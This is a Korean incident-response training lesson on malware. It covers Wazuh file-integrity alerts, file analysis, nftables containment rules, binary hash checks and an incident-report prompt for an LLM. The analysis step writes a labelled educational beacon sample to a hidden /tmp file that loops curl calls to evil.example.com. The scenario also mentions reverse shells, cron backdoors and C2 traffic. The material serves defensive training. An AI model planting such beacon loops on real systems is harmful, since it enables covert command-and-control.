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11: 인시던트 대응 실습 (2) - 악성코드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의심 파일과 프로세스를 조사하는 기법을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악성코드 감염 징후를 시스템 로그에서 탐지한다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 FIM/SCA를 활용한 악성코드 탐지를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악성코드 격리와 제거 절차를 수행한다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시나리오: 서버 악성코드 감염 의심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감염 의심 서버: secu (10.20.30.1) - 방화벽/IPS 서버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모니터링: siem (10.20.30.100) - Wazuh SIEM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분석 도구: web (10.20.30.80) - 파일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시나리오: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1) 공격자가 웹 취약점을 통해 리버스셸 설치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2) 지속성 확보를 위한 cron/systemd backdoor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3) 정보 유출을 위한 외부 통신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탐지 (Detection)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Wazuh SIEM에서 파일 무결성 변경 알림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Wazuh FIM 경보 확인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FIM 관련 경보 (rule.group: syscheck)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/var/ossec/logs/alerts/alerts.json 2&gt;/dev/null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alerts = []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 = json.loads(line.strip())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if 'syscheck' in str(a.get('rule',{}).get('groups',[])):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alerts.append(a)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except: pass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분석 (Analysis)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의심 파일이 발견되었다고 가정하고 분석 절차 실습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파일 분석 시뮬레이션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분석용 샘플 파일 생성 (교육용)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&gt; /tmp/.hidden_test &lt;&lt; 'SAMPLE'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교육용 샘플 - 실제 악성코드 아님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while true;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curl -s http://evil.example.com/beacon &gt;/dev/null 2&gt;&amp;1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sleep 300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SAMPLE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파일 유형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격리 (Containment)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프로세스 정보 수집 (kill 전에 반드시)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메모리 덤프 (포렌식용)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프로세스 중지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네트워크 격리 시뮬레이션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실제 격리는 수행하지 않음 - 규칙 예시만 표시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외부 통신 차단 nftables 규칙 (예시)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'RULES'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감염 서버 외부 통신 차단 (관리 SSH만 허용)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nft add rule inet filter output ip daddr != 10.20.30.0/24 drop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nft add rule inet filter output tcp dport 22 ip daddr 10.20.30.0/24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C2 IP 차단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nft add rule inet filter output ip daddr 45.33.0.0/16 drop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nft add rule inet filter input ip saddr 45.33.0.0/16 drop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RULES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제거 및 복구 (Eradication &amp; Recovery)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시스템 무결성 검증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패키지 무결성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dpkg 패키지 무결성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dpkg --verify 2&gt;/dev/null | head -10 || echo "dpkg verify 미지원"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중요 바이너리 해시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핵심 바이너리 해시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bin in /usr/bin/ssh /usr/bin/sudo /usr/bin/curl /bin/bash;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if [ -f "$bin" ]; then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HASH=$(sha256sum "$bin" 2&gt;/dev/null | cut -d' ' -f1)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"$bin: ${HASH:0:16}..."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fi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사후 분석과 보고 (Post-Incident)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"인시던트 대응 보고서 작성 전문가입니다. 한국어로 작성합니다."},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"다음 사건의 인시던트 대응 보고서 타임라인을 작성하세요:\n\n- 09:00 Wazuh FIM 경보: /dev/shm/.cache 파일 생성 탐지\n- 09:05 Suricata 경보: 외부 IP 45.33.x.x:4444 연결 시도\n- 09:10 SOC 분석관 확인: crontab에 5분마다 .cache 실행 등록\n- 09:15 CPU 98% 사용 확인 (코인 마이너 의심)\n- 09:20 네트워크 격리 (nftables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악성코드 탐지는 FIM, 프로세스 모니터링, 네트워크 분석을 조합한다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/dev/shm, /tmp의 숨김 파일과 비정상 cron 항목이 주요 탐지 포인트다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분석 전에 반드시 증거(해시, 메모리 덤프)를 보존한다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격리는 네트워크 차단 후 프로세스 중지 순서로 수행한다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사후 분석에서 ATT&amp;CK 매핑과 Lessons Learned가 핵심이다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FIM/SCA는 악성코드 탐지의 핵심 모니터링 도구다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12: 인시던트 대응 실습 (3) - 내부 위협 (sudo 남용, 비인가 접근)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12: 인시던트 대응 실습 (3) - 내부 위협 (sudo 남용, 비인가 접근)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